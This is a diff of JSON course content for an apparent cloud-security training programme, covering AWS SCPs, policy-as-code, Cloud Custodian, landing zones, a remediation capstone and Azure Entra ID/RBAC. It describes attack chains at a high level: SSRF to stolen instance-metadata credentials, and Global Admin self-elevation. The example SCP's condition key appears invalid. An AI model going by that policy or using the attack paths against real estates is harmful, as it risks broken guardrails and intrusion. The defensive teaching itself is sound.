+            "body": "Service Control Policies (SCPs) are organization-level guardrails in AWS Organizations. An SCP sets the maximum permissions any principal in an account can ever have, even the account's own admins and root. If an SCP denies an action, no IAM policy in that account can grant it back.\n\nMechanism: SCPs attach to an OU or account. The effective permission is the intersection of the SCP and the identity's IAM policy, an action must be allowed by both. This makes SCPs ideal for hard, non-negotiable rules: deny disabling CloudTrail, restrict to approved regions, require encryption.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Request action",
+                  "detail": "e.g. s3:PutBucketPublicAccess"
+                },
+                {
+                  "label": "SCP boundary check",
+                  "detail": "Allowed at org level?"
+                },
+                {
+                  "label": "IAM policy check",
+                  "detail": "Allowed for this identity?"
+                },
+                {
+                  "label": "Allow only if both",
+                  "detail": "SCP deny = hard stop, even root"
+                }
+              ]
+            },
+            "check": {
+              "question": "If an SCP explicitly denies an action, what can an account admin do to still perform it?",
+              "options": [
+                "Attach an IAM policy that allows it, which overrides the SCP",
+                "Nothing, an SCP deny cannot be overridden by any IAM policy in the account, including root",
+                "Use the root user, which bypasses SCPs",
+                "Switch to another region"
+              ],
+              "correctIndex": 1,
+              "explanation": "An SCP sets the permission ceiling for an entire account. A denied action cannot be granted back by any IAM policy, and even the root user is bound by SCPs. The effective permission is the intersection of SCP and IAM."
+            }
+          },
+          {
+            "title": "Worked Example: Deny Public S3 and Trail Tampering",
+            "body": "This SCP blocks two classic disasters org-wide: disabling CloudTrail, and removing an account's S3 public-access block. Attach it to an OU and every current and future account inherits it. Note the plain < and > are not needed here; SCPs are JSON. The key is Effect: Deny with specific actions, no IAM policy below can re-enable them.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "cat guardrail-scp.json",
+                  "output": "{ \"Version\":\"2012-10-17\", \"Statement\":[ {\"Sid\":\"DenyTrailTamper\",\"Effect\":\"Deny\",\"Action\":[\"cloudtrail:StopLogging\",\"cloudtrail:DeleteTrail\"],\"Resource\":\"*\"}, {\"Sid\":\"DenyPublicS3\",\"Effect\":\"Deny\",\"Action\":[\"s3:PutAccountPublicAccessBlock\",\"s3:PutBucketPublicAccessBlock\"],\"Resource\":\"*\",\"Condition\":{\"Bool\":{\"s3:PublicAccessBlockConfiguration\":\"false\"}}} ] }"
+                },
+                {
+                  "command": "aws organizations attach-policy --policy-id p-guardrail --target-id ou-prod --profile technieum",
+                  "output": "Attached. All accounts in ou-prod now inherit the deny."
+                }
+              ]
+            }
+          },
+          {
+            "title": "Policy-as-Code: OPA, Conftest, Checkov",
+            "body": "SCPs guard the live cloud. Policy-as-code guards the blueprint before it deploys, by scanning Infrastructure-as-Code (Terraform, CloudFormation).\n\nCheckov and tfsec scan Terraform/CFN for insecure patterns out of the box (public buckets, unencrypted volumes). OPA with Conftest lets you write custom rules in Rego and fail a plan that violates them. Run these in CI: a pull request that declares a public bucket fails the check and never merges. This is 'shift-left', catching misconfiguration at the cheapest possible point.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "checkov -d ./terraform",
+                  "output": "Check: CKV_AWS_20 \"S3 Bucket has an ACL defined which allows public access\""
+                },
+                {
+                  "command": "",
+                  "output": "  FAILED for resource: aws_s3_bucket.reports"
+                },
+                {
+                  "command": "",
+                  "output": "  File: /s3.tf:12-18"
+                },
+                {
+                  "command": "",
+                  "output": "Passed: 142  Failed: 1  -> exit code 1 (CI build fails)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Automated Remediation: Cloud Custodian",
+            "body": "Some bad states still slip through (a change made outside IaC, a gap in SCP coverage). Cloud Custodian closes the loop: it is a YAML policy engine that both detects AND acts. A policy can match 'any S3 bucket that is public' and then run an action, tag it, remove the public ACL, or notify.\n\nRun on a schedule or event-driven via CloudWatch/EventBridge, it becomes automated remediation: the moment a public bucket appears, Custodian reverts it within minutes. It is the enforcement layer that sits between pure detection and hard SCP prevention.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Event: bucket made public",
+                  "detail": "EventBridge triggers policy"
+                },
+                {
+                  "label": "Custodian filter matches",
+                  "detail": "resource: s3, filter: public"
+                },
+                {
+                  "label": "Action fires",
+                  "detail": "remove ACL / tag / notify"
+                },
+                {
+                  "label": "Resolved",
+                  "detail": "Reverted in minutes, logged"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Choosing the Right Mechanism",
+            "body": "These controls are layers, not competitors. Pick by where you want to stop the mistake.\n\nSCP: a hard, non-negotiable ceiling across accounts, use for absolute rules (no trail tampering, approved regions only). Permission boundary: caps what an IAM role/user can do within an account, used to safely delegate IAM. Config rule: continuous detection and compliance scoring. Policy-as-code (Checkov/OPA): catch it in CI before deploy. Cloud Custodian: auto-remediate what slips through. A mature program uses all of them.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "SCP",
+                  "points": [
+                    "Org/account ceiling",
+                    "Preventative",
+                    "Cannot be overridden"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Policy-as-code (CI)",
+                  "points": [
+                    "Scans IaC pre-deploy",
+                    "Shift-left",
+                    "Blocks the PR"
+                  ]
+                },
+                {
+                  "label": "Cloud Custodian",
+                  "points": [
+                    "Detect + act",
+                    "Auto-remediate",
+                    "Runtime enforcement"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do It: Guardrails as Code Lab, and Why It Matters",
+            "body": "In the module lab 'Guardrails as Code' you write SCPs and policy-as-code that prevent public S3, CloudTrail disabling and unencrypted resources, then prove a bad deploy is blocked: push a Terraform change declaring a public bucket and watch Checkov fail the pipeline, and try to disable a trail and watch the SCP refuse it.\n\nWhy it matters: detective controls scale with headcount, someone must triage every finding. Preventative guardrails scale with policy, one rule protects the whole estate forever. Prevention is how you stop fighting the same misconfiguration every week.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Detection-only program",
+                  "points": [
+                    "Endless findings backlog",
+                    "Human triage per issue",
+                    "Same bugs recur"
+                  ]
+                },
+                {
+                  "label": "Guardrailed program",
+                  "points": [
+                    "Bad states blocked up front",
+                    "One policy, whole estate",
+                    "Engineers can't easily go wrong"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m12-5",
+        "moduleId": "cloud-m12",
+        "number": 76,
+        "title": "Secure Landing Zones",
+        "type": "theory",
+        "week": 4,
+        "description": "Secure-by-default foundations. A well-built landing zone makes the secure path the easy path across every new account.",
+        "keyPoints": [
+          "AWS Control Tower / landing-zone blueprints with baked-in guardrails",
+          "Account-per-workload, centralised logging and security tooling accounts",
+          "Baseline SCPs, Config, GuardDuty and CloudTrail auto-enabled on new accounts",
+          "Infrastructure-as-code for the whole estate (Terraform, CDK) with policy gates",
+          "Golden-path templates so teams can't easily build insecurely"
+        ],
+        "slides": [
+          {
+            "title": "What a Landing Zone Is",
+            "body": "A landing zone is a pre-built, secure-by-default foundation that every new account 'lands' into. Instead of handing a team an empty account and hoping they configure it safely, you give them an account that already has logging, guardrails, identity and networking baselines switched on.\n\nAnalogy: a serviced office versus a bare warehouse. In the serviced office the fire exits, locks, alarms and wiring are already to code, you just move in your desks. A landing zone is the serviced office for cloud accounts: the secure path is the default path, because it is already built.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Bare account",
+                  "points": [
+                    "No logging by default",
+                    "No guardrails",
+                    "Team configures from scratch",
+                    "Secure path is the hard path"
+                  ]
+                },
+                {
+                  "label": "Landing zone account",
+                  "points": [
+                    "CloudTrail/Config on day one",
+                    "Baseline SCPs inherited",
+                    "GuardDuty enabled",
+                    "Secure path is the default"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: Multi-Account Structure",
+            "body": "Landing zones use many accounts, not one big account, organized in AWS Organizations by Organizational Unit (OU). The pattern is account-per-workload (or per-team/per-environment) so a breach in one account cannot reach another.\n\nSpecialized accounts sit at the center: a Log Archive account that centrally stores all CloudTrail/Config logs (immutable, separate from the workloads that generate them), and a Security/Audit account where tooling like Security Hub and GuardDuty aggregates findings. Guardrails attach to OUs so every account in the OU inherits them automatically.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "org",
+                  "label": "Organization root",
+                  "highlighted": true
+                },
+                {
+                  "id": "sec",
+                  "label": "Security OU (audit + log archive)"
+                },
+                {
+                  "id": "prod",
+                  "label": "Prod OU"
+                },
+                {
+                  "id": "dev",
+                  "label": "Dev OU"
+                },
+                {
+                  "id": "w1",
+                  "label": "Workload A account"
+                },
+                {
+                  "id": "w2",
+                  "label": "Workload B account"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "org",
+                  "to": "sec",
+                  "label": "central logging/tooling"
+                },
+                {
+                  "from": "org",
+                  "to": "prod",
+                  "label": "baseline SCPs"
+                },
+                {
+                  "from": "org",
+                  "to": "dev",
+                  "label": "baseline SCPs"
+                },
+                {
+                  "from": "prod",
+                  "to": "w1",
+                  "label": "inherits guardrails"
+                },
+                {
+                  "from": "prod",
+                  "to": "w2",
+                  "label": "inherits guardrails"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: Control Tower Baseline",
+            "body": "AWS Control Tower is the managed way to stand up a landing zone. When it provisions a new account through Account Factory, that account automatically gets the baseline: CloudTrail and Config enabled, logs shipped to the central Log Archive account, baseline SCPs (Control Tower calls them 'controls' or 'guardrails') applied, and often GuardDuty enabled.\n\nThe effect: an engineer requests an account and receives a secure one minutes later, with no manual hardening. The screen below shows the baseline that lands automatically.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws controltower list-enabled-controls --target-identifier ou-prod --profile technieum",
+                  "output": "- AWS-GR_RESTRICT_ROOT_USER (preventative)"
+                },
+                {
+                  "command": "",
+                  "output": "- AWS-GR_ENCRYPTED_VOLUMES (detective)"
+                },
+                {
+                  "command": "",
+                  "output": "- AWS-GR_DISALLOW_PUBLIC_S3_BUCKET (preventative)"
+                },
+                {
+                  "command": "",
+                  "output": "- AWS-GR_CLOUDTRAIL_ENABLED (preventative)"
+                },
+                {
+                  "command": "# new account via Account Factory",
+                  "output": "Provisioned: workload-c  (CloudTrail on, logs -> log-archive, SCPs inherited)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Baseline Services on Every New Account",
+            "body": "The defining property of a good landing zone is that security tooling is auto-enabled, not opt-in. A new account should arrive with: CloudTrail (audit logging, all regions), Config (resource recording and compliance), GuardDuty (threat detection), and baseline SCPs (the hard guardrails).\n\nThe reason this must be automatic: anything a team has to remember to turn on will eventually be forgotten, and the one account where GuardDuty was never enabled is the one that gets breached quietly. Auto-enablement removes the human from the critical step.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Account created",
+                  "detail": "via Account Factory / IaC"
+                },
+                {
+                  "label": "Guardrails inherited",
+                  "detail": "Baseline SCPs from the OU"
+                },
+                {
+                  "label": "Detection enabled",
+                  "detail": "GuardDuty, Config, Security Hub"
+                },
+                {
+                  "label": "Logging centralised",
+                  "detail": "CloudTrail -> Log Archive account"
+                }
+              ]
+            },
+            "check": {
+              "question": "Why should baseline security services like CloudTrail and GuardDuty be auto-enabled on new accounts rather than opt-in?",
+              "options": [
+                "Auto-enablement is cheaper to license",
+                "Anything a team must remember to enable will eventually be forgotten, and that gap becomes the weak account an attacker finds",
+                "Opt-in services cannot be scanned by CSPM",
+                "AWS requires it for billing"
+              ],
+              "correctIndex": 1,
+              "explanation": "Relying on humans to turn on security tooling guarantees some account eventually misses it. Auto-enabling the baseline through the landing zone removes the human from the critical step, so every account is protected by default."
+            }
+          },
+          {
+            "title": "Infrastructure-as-Code and Golden Paths",
+            "body": "The whole estate, accounts, OUs, guardrails, network baselines, is defined in Infrastructure-as-Code (Terraform, CDK, or Control Tower Account Factory for Terraform). This makes the foundation reviewable, version-controlled and reproducible, and lets policy gates run before anything deploys.\n\nOn top sit golden-path templates: pre-approved, pre-hardened building blocks (a secure 'web service' module, a locked-down 'data store' module) that teams assemble. Because the easy, documented way to build is already secure, teams rarely need, or bother, to build insecurely.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Ad hoc building",
+                  "points": [
+                    "Each team reinvents config",
+                    "Security optional and inconsistent",
+                    "Hard to audit"
+                  ]
+                },
+                {
+                  "label": "Golden paths",
+                  "points": [
+                    "Pre-hardened modules",
+                    "Secure defaults baked in",
+                    "Insecure path is extra effort"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters",
+            "body": "A landing zone shifts security from endless cleanup to a solid foundation. The economics are decisive: harden the foundation once, and every one of the hundreds of accounts that lands on it inherits that work, including accounts created next year by people who have never heard of the security team.\n\nIt also contains blast radius (account-per-workload), guarantees evidence (central immutable logging) and makes compliance largely a property of the platform rather than a per-team project. The guiding principle throughout: make the secure path the easy path, so doing the right thing requires no extra effort.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Harden foundation once",
+                  "detail": "Guardrails + baselines in IaC"
+                },
+                {
+                  "label": "Every new account inherits",
+                  "detail": "Secure by default, automatically"
+                },
+                {
+                  "label": "Blast radius contained",
+                  "detail": "Account-per-workload isolation"
+                },
+                {
+                  "label": "Secure path = easy path",
+                  "detail": "Teams can't easily go wrong"
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m12-6",
+        "moduleId": "cloud-m12",
+        "number": 77,
+        "title": "Capstone: Secure the Estate",
+        "type": "exercise",
+        "week": 4,
+        "description": "The course capstone. Students take a deliberately broken multi-account estate, assess it, prioritise and remediate, and stand up continuous guardrails to keep it secure.",
+        "keyPoints": [
+          "Full CSPM scan and attack-path analysis to find the real risks",
+          "Prioritise by exploitability and blast radius, not finding count",
+          "Remediate the top paths and enforce preventative SCPs/policy-as-code",
+          "Enable detection and IR so residual risk is caught fast",
+          "Produce an executive-ready posture report with before/after evidence"
+        ],
+        "slides": [
+          {
+            "title": "What the Capstone Is",
+            "body": "The capstone is the course's final exercise: you are handed a deliberately broken, multi-account AWS estate and must take it from insecure to defensible. You assess it, prioritise the real risks, remediate the worst, and stand up continuous guardrails and detection so it stays secure.\n\nAnalogy: you are not inspecting one house, you are the new security lead of a whole neighbourhood that was built with no code enforcement. The job is not to log every cracked tile; it is to find the houses that are actually on fire, put them out, and change the building rules so it stops happening.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Assess",
+                  "detail": "CSPM + attack-path analysis"
+                },
+                {
+                  "label": "Prioritise",
+                  "detail": "By exploitability + blast radius"
+                },
+                {
+                  "label": "Remediate",
+                  "detail": "Fix top paths, add SCPs"
+                },
+                {
+                  "label": "Detect + report",
+                  "detail": "IR enabled, before/after evidence"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Step 1: Assess the Whole Estate",
+            "body": "Start wide. Run a full CSPM scan across every account (Prowler/ScoutSuite or Security Hub org-wide) to inventory misconfigurations. But a flat list of findings is not enough for a multi-account estate, you also need attack-path analysis: how could an attacker chain findings together across accounts to reach something valuable?\n\nTools like Prowler for config plus a privilege-path mapper reveal chains such as: public web app -> SSRF -> instance role -> cross-account trust -> admin in the prod account. The chain, not any single finding, is the real risk.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "app",
+                  "label": "Public app (SSRF)",
+                  "highlighted": true
+                },
+                {
+                  "id": "role",
+                  "label": "EC2 instance role"
+                },
+                {
+                  "id": "s3",
+                  "label": "Sensitive S3 (customer data)"
+                },
+                {
+                  "id": "cross",
+                  "label": "Cross-account admin role"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "app",
+                  "to": "role",
+                  "label": "steal creds via metadata"
+                },
+                {
+                  "from": "role",
+                  "to": "s3",
+                  "label": "s3:GetObject"
+                },
+                {
+                  "from": "role",
+                  "to": "cross",
+                  "label": "sts:AssumeRole"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Step 2: Prioritise by Exploitability, Not Count",
+            "body": "The estate will throw thousands of findings. The capstone is graded on judgement, not volume. Rank by two questions: how exploitable is it (internet-reachable, needs no special access), and how big is the blast radius (one bucket vs the whole org).\n\nA public S3 bucket with customer PII and a cross-account admin path beat 500 'missing tag' findings every time. Produce a short prioritised list, your top ~10 risks with a one-line justification each, and work that, not the raw dump. This mirrors exactly how real cloud security teams operate under limited time.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Fix by count (wrong)",
+                  "points": [
+                    "Chase 1000s of low findings",
+                    "Burn time on cosmetics",
+                    "Real paths stay open"
+                  ]
+                },
+                {
+                  "label": "Fix by risk (right)",
+                  "points": [
+                    "Top ~10 exploitable paths first",
+                    "Internet + sensitive + wide blast radius",
+                    "Collapse whole attack chains"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Step 3: Remediate and Enforce Prevention",
+            "body": "Fix the top paths, then make them unrepeatable. Remediation closes today's holes (remove public access, cut the over-broad cross-account trust, rotate exposed keys). Prevention stops them coming back: attach SCPs and policy-as-code so the same misconfiguration is blocked org-wide.\n\nThe discipline: for every risk you remediate, add a preventative guardrail. Removed a public bucket? Add the deny-public-S3 SCP. Found a disabled trail? Add the deny-trail-tampering SCP. This is the difference between cleaning up once and actually changing the estate's trajectory.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Remediate the finding",
+                  "detail": "e.g. block public S3 access now"
+                },
+                {
+                  "label": "Add a guardrail",
+                  "detail": "SCP: deny public S3 org-wide"
+                },
+                {
+                  "label": "Shift-left check",
+                  "detail": "Checkov in CI for IaC"
+                },
+                {
+                  "label": "Won't recur",
+                  "detail": "Same misconfig blocked everywhere"
+                }
+              ]
+            },
+            "check": {
+              "question": "After removing a public S3 bucket in the capstone, what is the most durable next step?",
+              "options": [
+                "Move on, the finding is resolved",
+                "Attach a preventative SCP that denies public S3 across the organization so the misconfiguration cannot recur",
+                "Delete the account containing the bucket",
+                "Disable CloudTrail to reduce noise"
+              ],
+              "correctIndex": 1,
+              "explanation": "Remediation alone fixes today's instance; the problem returns with the next change. Pairing each fix with a preventative guardrail (an SCP denying public S3 org-wide) changes the estate's trajectory so the same mistake is blocked everywhere."
+            }
+          },
+          {
+            "title": "Step 4: Detection and Incident Response",
+            "body": "No estate is ever 100% prevented, so residual risk must be caught fast. Enable detection on every account: GuardDuty for threat detection, Security Hub to aggregate findings, CloudTrail feeding alerts for high-risk actions (root login, trail changes, new cross-account trusts).\n\nThen define the response: who is alerted, what the runbook is, how an incident is contained. The goal of this step is detection-to-response time, if a guardrail is bypassed or a new exposure appears, you want to know in minutes and have a plan, not discover it in a breach notification.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "GuardDuty + Security Hub",
+                  "detail": "Threat detection on every account"
+                },
+                {
+                  "label": "High-risk CloudTrail alerts",
+                  "detail": "Root login, trail change, new trust"
+                },
+                {
+                  "label": "Alert routes to responders",
+                  "detail": "EventBridge -> SNS / ticket"
+                },
+                {
+                  "label": "Runbook executes",
+                  "detail": "Contain, investigate, recover"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Step 5: The Executive Posture Report",
+            "body": "The deliverable is an executive-ready report with before/after evidence. Leadership does not want a 3,000-line scan dump; they want: what was the risk, what did we do, what is the residual exposure, and proof. Show the CIS/Security Hub compliance score before and after, the top attack paths closed, the guardrails now enforcing prevention, and the detection now in place.\n\nFrame impact in business terms (customer data exposure closed, blast radius reduced) and back every claim with evidence (a score moving from 61% to 92%, a screenshot of the SCP blocking a bad deploy).",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Before",
+                  "points": [
+                    "CIS score 61%",
+                    "3 critical attack paths open",
+                    "No org guardrails",
+                    "Patchy logging"
+                  ]
+                },
+                {
+                  "label": "After",
+                  "points": [
+                    "CIS score 92%",
+                    "Critical paths closed",
+                    "SCPs + policy-as-code enforcing",
+                    "Central logging + GuardDuty on"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters: The Whole Loop",
+            "body": "The capstone ties the entire course into one loop that real cloud security teams run forever: assess (CSPM + attack paths), prioritise (exploitability + blast radius), remediate and prevent (fixes + SCPs/policy-as-code), detect and respond (GuardDuty + IR), and report (evidence-backed, business-framed).\n\nThe meta-lesson: security is not a one-time cleanup, it is a continuous program where each incident tightens the guardrails. Finish this and you can walk into a messy multi-account estate and leave it measurably, defensibly, and continuously more secure, which is exactly the job.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "assess",
+                  "label": "Assess",
+                  "highlighted": true
+                },
+                {
+                  "id": "prio",
+                  "label": "Prioritise"
+                },
+                {
+                  "id": "rem",
+                  "label": "Remediate + Prevent"
+                },
+                {
+                  "id": "det",
+                  "label": "Detect + Respond"
+                },
+                {
+                  "id": "rep",
+                  "label": "Report"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "assess",
+                  "to": "prio",
+                  "label": "findings + paths"
+                },
+                {
+                  "from": "prio",
+                  "to": "rem",
+                  "label": "top risks"
+                },
+                {
+                  "from": "rem",
+                  "to": "det",
+                  "label": "residual risk"
+                },
+                {
+                  "from": "det",
+                  "to": "rep",
+                  "label": "evidence"
+                },
+                {
+                  "from": "rep",
+                  "to": "assess",
+                  "label": "loop continuously"
+                }
+              ]
+            }
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "cloud-m13",
+    "name": "Multi-Cloud Security: Azure & GCP",
+    "shortName": "Azure & GCP Security",
+    "month": 4,
+    "weeks": [
+      4
+    ],
+    "description": "Extends the AWS-centred skillset to Azure and GCP so students can secure a multi-cloud reality. Covers Entra ID and Azure RBAC, Google Cloud IAM and service-account impersonation, provider-specific attack paths, and the cross-cloud identity federation that creates its own risks.",
+    "estimatedHours": 11,
+    "outcomes": [
+      "Map the AWS security model onto Azure (Entra ID, RBAC, subscriptions) and GCP (IAM, projects, service accounts)",
+      "Execute provider-specific attack paths: Azure managed-identity abuse and GCP service-account impersonation",
+      "Identify Azure and GCP equivalents of S3 exposure, SSRF-metadata and privilege escalation",
+      "Secure cross-cloud and third-party identity federation"
+    ],
+    "topics": [
+      {
+        "id": "cloud-m13-1",
+        "moduleId": "cloud-m13",
+        "number": 78,
+        "title": "Azure Identity: Entra ID & RBAC",
+        "type": "theory",
+        "week": 4,
+        "description": "Azure's identity model differs meaningfully from AWS. Entra ID (formerly Azure AD) governs identity while Azure RBAC governs resource access, and the two layers interact.",
+        "keyPoints": [
+          "Entra ID: users, groups, service principals, app registrations, managed identities",
+          "Azure RBAC role assignments scoped at management group / subscription / RG / resource",
+          "Entra roles (Global Admin, Privileged Role Admin) vs Azure RBAC roles",
+          "Conditional Access and MFA as the primary identity guardrails",
+          "The Entra/Azure-RBAC split as a frequent source of confusion and misconfig"
+        ],
+        "slides": [
+          {
+            "title": "Two Control Planes, Not One",
+            "body": "AWS has a single identity system: IAM. Azure deliberately splits the job in two. Entra ID (its old name was Azure Active Directory) answers 'who are you?' — it stores accounts and signs people and apps in. Azure RBAC (Role-Based Access Control) answers 'what can you touch?' — it grants permissions on resources like virtual machines and storage.\n\nAnalogy: a corporate building. Entra ID is the front desk that issues your badge. Azure RBAC is the set of door locks that decides which rooms the badge opens. A valid badge (you are authenticated in Entra) opens nothing until a lock is configured to accept it (an RBAC assignment exists). Confusing these two layers is one of the most common sources of Azure misconfiguration."
+          },
+          {
+            "title": "Entra ID vs Azure RBAC, side by side",
+            "body": "Keep the two planes mentally separate. Entra ID is tenant-wide and about identities and sign-in. Azure RBAC is per-resource and about which API actions a principal may call. They even have their own role lists that sound similar but are unrelated — an Entra 'Global Administrator' is not an Azure 'Owner'.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Entra ID (identity plane)",
+                  "points": [
+                    "Directory of identities, tenant-wide",
+                    "Users, groups, service principals, app registrations, managed identities",
+                    "Entra roles: Global Admin, Privileged Role Admin, User Admin",
+                    "Governs sign-in, MFA, Conditional Access",
+                    "Scope = the whole tenant"
+                  ]
+                },
+                {
+                  "label": "Azure RBAC (resource plane)",
+                  "points": [
+                    "Permissions on Azure resources",
+                    "Assignment = principal + role definition + scope",
+                    "Built-in roles: Owner, Contributor, Reader, User Access Administrator",
+                    "Governs ARM actions (Microsoft.Compute/*, Microsoft.Storage/*)",
+                    "Scope = management group / subscription / resource group / resource"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "What lives in an Entra tenant",
+            "body": "Five identity object types matter for security. A user is a human account. A group bundles users for easier assignment. An app registration is the definition of an application; when it is used in your tenant it gets a service principal — the app's own identity that can hold credentials (a client secret or certificate). A managed identity is a special, passwordless identity that Azure creates and rotates for a resource such as a VM — there is no secret to leak, which is both safer and, when stolen at runtime, powerful.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "tenant",
+                  "label": "Entra ID Tenant",
+                  "highlighted": true
+                },
+                {
+                  "id": "user",
+                  "label": "Users (humans)"
+                },
+                {
+                  "id": "group",
+                  "label": "Groups"
+                },
+                {
+                  "id": "app",
+                  "label": "App Registration (app definition)"
+                },
+                {
+                  "id": "sp",
+                  "label": "Service Principal (app identity, holds secret/cert)",
+                  "highlighted": true
+                },
+                {
+                  "id": "mi",
+                  "label": "Managed Identity (passwordless, Azure-managed)",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "tenant",
+                  "to": "user"
+                },
+                {
+                  "from": "tenant",
+                  "to": "group"
+                },
+                {
+                  "from": "tenant",
+                  "to": "app"
+                },
+                {
+                  "from": "app",
+                  "to": "sp",
+                  "label": "instantiates"
+                },
+                {
+                  "from": "tenant",
+                  "to": "mi"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How an RBAC assignment is evaluated",
+            "body": "An RBAC role assignment binds exactly three things: a principal (the object ID of a user, group, SP or managed identity), a role definition (a named bundle of allowed Actions and NotActions, e.g. Contributor), and a scope. When a call reaches Azure Resource Manager, Azure gathers every assignment that applies to that principal at the target scope or any parent scope, unions the allowed actions, subtracts any deny assignments, and permits the call if the requested action matches.\n\nThe key rule is inheritance: assignments flow downward. A Contributor assignment at the subscription applies to every resource group and every resource beneath it.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "mg",
+                  "label": "Management Group"
+                },
+                {
+                  "id": "sub",
+                  "label": "Subscription"
+                },
+                {
+                  "id": "rg",
+                  "label": "Resource Group — Contributor assigned here",
+                  "highlighted": true
+                },
+                {
+                  "id": "res",
+                  "label": "VM + Storage (inherit Contributor)",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "mg",
+                  "to": "sub",
+                  "label": "inherits"
+                },
+                {
+                  "from": "sub",
+                  "to": "rg",
+                  "label": "inherits"
+                },
+                {
+                  "from": "rg",
+                  "to": "res",
+                  "label": "inherits"
+                }
+              ]
+            },
+            "check": {
+              "question": "A principal is assigned the Contributor role scoped to a resource group. What can it manage?",
+              "options": [
+                "Only resources explicitly named in the assignment",
+                "Every resource inside that resource group, by inheritance",
+                "Every resource in the whole subscription",
+                "Nothing until an Entra directory role is also granted"
+              ],
+              "correctIndex": 1,
+              "explanation": "RBAC assignments inherit downward from their scope. A Contributor role at a resource group applies to all resources within that group, but not to sibling groups or the wider subscription."
+            }
+          },
+          {
+            "title": "The two role lists never auto-sync",
+            "body": "A Global Administrator in Entra is not automatically Owner on your subscriptions, and a subscription Owner cannot by default read the Entra directory. The planes are independent — which is exactly why people mis-wire them. There is one dangerous bridge: a Global Admin can toggle 'Access management for Azure resources' to elevate themselves to User Access Administrator at the root scope, crossing from the identity plane into the resource plane.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "az role assignment list --assignee alice@contoso.com --all -o table",
+                  "output": "Principal            Role         Scope\nalice@contoso.com    Contributor  /subscriptions/8f.../resourceGroups/prod"
+                },
+                {
+                  "command": "az ad user get-member-groups --id alice@contoso.com -o table",
+                  "output": "DisplayName\n----------\nFinance-Team      <- a separate query against the Entra directory"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Conditional Access and MFA: the real front door",
+            "body": "Conditional Access (CA) policies are if-then rules in Entra: 'if the user is in group X and signs in from outside the corporate network, then require MFA / block legacy authentication / require a compliant device.' MFA plus CA are the primary identity guardrails because a stolen password alone should not yield a usable token.\n\nGaps worth looking for during an assessment: legacy auth protocols (IMAP, POP, SMTP) that bypass CA entirely, policies left in 'report-only' mode that log but never enforce, and break-glass accounts excluded from every policy."
+          },
+          {
+            "title": "How to spot the misconfiguration",
+            "body": "Enumerate assignments and hunt for over-scope. With the CLI: `az role assignment list --all` and `az role definition list`. Red flags:\n\n- Assignments at subscription or management-group scope (very broad blast radius).\n- Owner or User Access Administrator granted to a service principal (an app can now re-assign roles).\n- Custom role definitions whose Actions contain a wildcard '*'.\n- Service principals with stale or over-permissioned credentials.\n\nFor identity-plane review, check which accounts hold Global Admin and whether Privileged Identity Management (PIM) is used to make those roles just-in-time rather than standing."
+          },
+          {
+            "title": "Why it matters",
+            "body": "Real Azure compromises usually begin at the Entra/RBAC seam. Over-privileged service principals, a Global Admin who self-elevates to Owner, and the simple confusion of 'which plane grants this?' are repeatedly the root cause. For every permission you review, ask two questions: which plane grants it (Entra or RBAC), and at what scope. The next topic turns these concepts into concrete attack paths — managed-identity theft, SP secret abuse and RBAC escalation."
+          }
+        ]
+      },
+      {
